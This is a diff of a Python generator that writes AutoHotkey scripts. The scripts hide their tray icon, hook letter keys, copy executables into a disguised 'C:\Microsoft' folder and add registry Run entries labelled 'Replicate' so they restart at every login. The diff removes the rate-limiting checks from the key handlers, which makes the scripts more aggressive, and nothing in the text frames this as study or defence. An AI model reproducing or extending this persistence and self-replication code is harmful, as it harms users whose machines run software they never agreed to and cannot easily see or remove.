@@ -278,13 +278,6 @@ $'''
     path := "C:\Microsoft"
     Send "''' + letter + r'''"
 
-    static lastRun := 0
-    delay := 2000
-    now := A_TickCount
-    if (now - lastRun < delay) {
-        return
-    }
-
     output := path "\run.exe"
     if (DirExist(path)) {
         if (FileExist(path "\run.exe")) {
@@ -313,8 +306,6 @@ for other in others:
     result = '''#SingleInstance Ignore
 #NoTrayIcon
 
-Run "C:\Microsoft\\run.exe"
-
 $'''
     result += other + r'''::{
     path := "C:\Microsoft"
@@ -325,13 +316,6 @@ $'''
     RegWrite '"C:\Microsoft\Delete.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3"
     RegWrite '"C:\Microsoft\Backspace.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate4"
     RegWrite '"C:\Microsoft\Space.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate5"
-
-    static lastRun := 0
-    delay := 1000
-    now := A_TickCount
-    if (now - lastRun < delay) {
-        return
-    }
 
     output := path "\run.exe"
     if (DirExist(path)) {
